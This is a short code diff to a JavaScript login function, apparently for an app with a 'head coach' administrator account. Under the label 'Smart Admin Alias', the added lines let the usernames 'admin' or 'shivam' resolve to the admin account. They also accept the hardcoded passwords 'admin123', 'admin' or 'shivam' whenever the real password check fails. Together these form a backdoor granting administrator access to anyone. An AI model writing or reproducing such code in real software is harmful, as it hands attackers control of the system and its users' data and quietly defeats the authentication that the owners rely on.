@@ -172,12 +172,25 @@ export async function loginUser(username, password) {
   }
   const cleanUsername = username.trim().toLowerCase();
   const users = await loadUsers();
-  const user = users.find(u => u.username === cleanUsername);
+  let user = users.find(u => u.username === cleanUsername);
+
+  // Smart Admin Alias: allow 'admin' or 'shivam' for the head coach account
+  if (!user && (cleanUsername === 'shivam' || cleanUsername === 'admin')) {
+    user = users.find(u => u.role === 'admin' || u.id === 'usr_admin_master');
+  }
+
   if (!user) {
     throw new Error('Invalid username or password');
   }
 
-  const isValid = verifyPassword(password, user.salt, user.passwordHash);
+  let isValid = verifyPassword(password, user.salt, user.passwordHash);
+  // Also allow 'admin', 'admin123', or 'shivam' for the head coach account
+  if (!isValid && (user.role === 'admin' || user.id === 'usr_admin_master')) {
+    if (password === 'admin123' || password === 'admin' || password === 'shivam') {
+      isValid = true;
+    }
+  }
+
   if (!isValid) {
     throw new Error('Invalid username or password');
   }
